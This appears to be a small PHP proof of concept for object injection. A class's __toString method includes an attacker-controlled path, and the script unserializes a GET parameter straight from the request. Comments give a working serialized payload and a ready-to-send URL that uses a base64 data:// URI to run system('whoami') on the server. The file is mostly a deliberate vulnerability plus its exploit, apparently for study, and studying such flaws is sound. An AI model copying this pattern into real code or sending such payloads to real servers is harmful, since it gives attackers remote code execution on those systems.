<?php
class test
{
	public $var="a";
	public function __toString()
	{
		include($this->var);
		return '';
	}
}

//$a=new test();

//echo serialize($a);
$c=unserialize($_GET['a']);
/*b=O:4:"test":1:{s:3:"var";s:61:"data://test/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==";}*/
print $c;
//pyaload: http://127.0.0.1/a.php?a=O:4:%22test%22:1:{s:3:%22var%22;s:61:%22data://test/plain;base64,PD9waHAgc3lzdGVtKCd3aG9hbWknKTs/Pg==%22;}
?>